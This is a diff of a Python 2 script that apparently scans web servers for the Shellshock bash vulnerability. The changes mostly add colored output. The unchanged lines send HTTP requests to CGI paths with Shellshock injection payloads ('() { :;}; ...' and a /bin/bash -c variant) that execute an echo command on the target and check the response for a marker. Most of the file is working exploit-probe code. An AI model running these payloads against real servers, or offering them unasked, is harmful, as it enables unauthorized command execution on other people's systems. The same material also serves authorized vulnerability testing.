@@ -1,6 +1,11 @@
 #! /usr/bin/env python
 from urlparse import urlparse
-import httplib, time, sys, argparse
+import httplib, time, sys
+
+RESET = "\033[39m"
+RED = "\033[31m"
+GREEN = "\033[32m"
+BLUE = "\033[34m"
 
 if len(sys.argv) < 2:
   print "Usage:"
@@ -51,20 +56,20 @@ for script in scripts:
     res = sendGet(script, None)
     if res.status == 200:
       hits += 1
-      print "\r[+] We've got a candidate: "+script
+      print "\r%s[+]%s We've got a candidate: %s%s%s" %(BLUE, RESET, GREEN, script, RESET)
       test1 = sendGet(script, "() { :;}; echo; echo \"p33kab00\"")
       test2 = sendGet(script, "() { :;}; /bin/bash -c 'echo; echo p33kab00'")
       if test1.status == 200 and "p33kab00" in test1.read():
         vlns += 1
-        print "    Whoa - it's vulnerable!\n"
+        print "    %sWhoa - it's vulnerable!%s\n" %(GREEN, RESET)
       elif test2.status == 200 and "p33kab00" in test2.read():
-        print "    Whoa - it's vulnerable!\n"
+        print "    %sWhoa - it's vulnerable!%s\n" %(GREEN, RESET)
         vlns += 1
       elif test1.status == 500:
-        print "    Oh - it might be vulnerable.\n"
+        print "    %sOh - it might be vulnerable.%s\n" %(BLUE, RESET)
         vlns += 1
       elif test2.status == 500:
-        print "    Oh - it might be vulnerable.\n"
+        print "    %sOh - it might be vulnerable.%s\n" %(BLUE, RESET)
         vlns += 1
       else:
         print "    Nah - Can't tell if it's vulnerable. Give it a go anyway.\n"
